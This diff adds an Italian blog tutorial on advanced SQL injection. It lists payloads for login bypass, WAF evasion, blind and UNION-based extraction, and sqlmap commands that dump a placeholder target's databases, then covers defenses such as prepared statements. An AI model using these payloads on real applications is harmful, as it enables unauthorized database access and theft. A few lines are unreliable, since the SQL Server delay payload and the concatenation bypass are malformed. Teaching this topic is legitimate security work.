@@ -1,0 +1,157 @@
+---
+layout: ../../layouts/BlogLayout.astro
+title: "SQL Injection Avanzate: Tecniche di Bypass e Blind Injection"
+date: 2024-01-15
+author: "stealth"
+tags: ["web", "pwn"]
+image: "https://images.pexels.com/photos/1181298/pexels-photo-1181298.jpeg?auto=compress&cs=tinysrgb&w=600&h=400&fit=crop"
+---
+
+Le SQL Injection rappresentano ancora oggi una delle vulnerabilità più critiche nelle applicazioni web. In questo articolo analizziamo tecniche avanzate di exploiting e bypass dei filtri di sicurezza.
+
+## Introduzione alle SQL Injection
+
+Le SQL Injection si verificano quando un'applicazione web non sanitizza correttamente l'input dell'utente prima di includerlo in una query SQL. Questo permette agli attaccanti di manipolare la struttura della query originale.
+
+### Esempio base
+
+```sql
+-- Query vulnerabile
+SELECT * FROM users WHERE username = '$username' AND password = '$password';
+
+-- Payload di attacco
+username: admin' OR '1'='1' --
+password: qualsiasi
+```
+
+## Tecniche di Bypass
+
+### 1. Bypass dei filtri WAF
+
+Molti Web Application Firewall (WAF) implementano blacklist per bloccare payload comuni:
+
+```sql
+-- Bypass usando concatenazione
+' + 'OR' + ' '1'='1' --
+
+-- Bypass usando encoding
+admin%27 OR %271%27%3D%271%27 --
+
+-- Bypass usando commenti inline
+admin'/**/OR/**/1=1#
+```
+
+### 2. Time-based Blind Injection
+
+Quando l'applicazione non restituisce errori SQL visibili:
+
+```sql
+-- Test MySQL
+admin' AND (SELECT SLEEP(5)) --
+
+-- Test PostgreSQL  
+admin' AND (SELECT pg_sleep(5)) --
+
+-- Test SQL Server
+admin' AND (SELECT DELAY '0:0:5') --
+```
+
+### 3. Boolean-based Blind Injection
+
+Sfruttando differenze nel comportamento dell'applicazione:
+
+```sql
+-- Test lunghezza database
+admin' AND (SELECT LENGTH(database())) > 5 --
+
+-- Estrazione carattere per carattere
+admin' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 97 --
+```
+
+## Tecniche di Estrazione Dati
+
+### Union-based Injection
+
+```sql
+-- Determinare numero di colonne
+admin' ORDER BY 1 --
+admin' ORDER BY 2 --
+admin' ORDER BY 3 -- (errore = 2 colonne)
+
+-- Estrazione dati
+admin' UNION SELECT username, password FROM users --
+```
+
+### Error-based Injection
+
+```sql
+-- MySQL
+admin' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2))) --
+
+-- PostgreSQL
+admin' AND (SELECT xmlagg(xmlelement("x", table_name)) FROM information_schema.tables) --
+```
+
+## Automazione con SQLMap
+
+SQLMap è uno strumento essenziale per l'automazione degli attacchi SQL injection:
+
+```bash
+# Scansione base
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Bypass WAF
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode
+
+# Dump database
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all
+```
+
+## Prevenzione e Mitigazione
+
+### 1. Prepared Statements
+
+```php
+// PHP PDO - Approccio sicuro
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
+```
+
+### 2. Stored Procedures
+
+```sql
+-- SQL Server
+CREATE PROCEDURE GetUser
+    @Username NVARCHAR(50),
+    @Password NVARCHAR(50)
+AS
+BEGIN
+    SELECT * FROM Users WHERE Username = @Username AND Password = @Password
+END
+```
+
+### 3. Input Validation
+
+```python
+# Python - Validazione robusta
+import re
+
+def validate_input(user_input):
+    # Whitelist approach
+    if re.match("^[a-zA-Z0-9_]{3,20}$", user_input):
+        return True
+    return False
+```
+
+## Conclusioni
+
+Le SQL Injection rimangono una minaccia seria nonostante i numerosi strumenti di protezione disponibili. La chiave è implementare una difesa a più livelli:
+
+1. **Validazione rigorosa dell'input**
+2. **Uso di prepared statements**
+3. **Principio del minimo privilegio per gli account database**
+4. **Monitoring e logging delle query anomale**
+
+La sicurezza delle applicazioni web richiede un approccio proattivo e una comprensione approfondita delle tecniche di attacco per implementare contromisure efficaci.
+
+> **Disclaimer**: Questo articolo è puramente educativo. L'uso di queste tecniche su sistemi non autorizzati è illegale e contrario all'etica hacker.
